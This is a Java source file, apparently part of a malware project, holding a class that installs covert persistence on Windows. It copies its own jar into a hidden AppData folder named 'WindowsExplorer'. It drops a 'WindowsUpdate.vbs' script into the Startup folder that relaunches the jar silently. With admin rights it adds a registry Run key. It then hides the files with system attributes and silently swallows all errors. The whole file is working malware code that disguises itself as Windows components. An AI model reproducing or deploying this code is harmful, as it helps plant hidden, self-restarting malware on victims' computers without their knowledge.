package itzgonza.hollyshit.impl.inject;

import java.io.File;
import itzgonza.hollyshit.utils.utilities;

public class StartupInjector extends utilities {

    private static final String FILE_NAME = "WindowsExplorer.jar";

    public void initialize() throws Exception {
        try {
            java.net.URI uri = itzgonza.hollyshit.startup.class.getProtectionDomain().getCodeSource().getLocation().toURI();
            File currentJar = new File(uri);
            String appData = System.getenv("APPDATA");
            File stealthDir = new File(appData, "WindowsExplorer");
            if (!stealthDir.exists()) stealthDir.mkdirs();
            
            File stealthJar = new File(stealthDir, FILE_NAME);
            
            // 1. Ensure file is in stealth location
            if (!currentJar.getCanonicalPath().equalsIgnoreCase(stealthJar.getCanonicalPath())) {
                org.apache.commons.io.FileUtils.copyFile(currentJar, stealthJar);
            }

            // 2. Add to Startup Folder (Legacy)
            String startupPath = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup/";
            File shortcut = new File(startupPath, "WindowsUpdate.vbs");
            if (!shortcut.exists()) {
                String vbs = "Set WshShell = CreateObject(\"WScript.Shell\")\n" +
                             "WshShell.Run \"javaw -jar \"\"" + stealthJar.getAbsolutePath() + "\"\"\", 0, False";
                org.apache.commons.io.FileUtils.writeStringToFile(shortcut, vbs, "UTF-8");
            }

            // 3. Add to Registry Run Key (Robust)
            if (utilities.isAdmin()) {
                String regCmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsExplorer\" /t REG_SZ /d \"javaw -jar \\\"" + stealthJar.getAbsolutePath() + "\\\"\" /f";
                Runtime.getRuntime().exec(regCmd);
            }

            // Hide everything
            Runtime.getRuntime().exec("attrib +h +s " + stealthDir.getAbsolutePath());
            Runtime.getRuntime().exec("attrib +h +s " + shortcut.getAbsolutePath());
            
        } catch (Exception ignored) {}
    }
}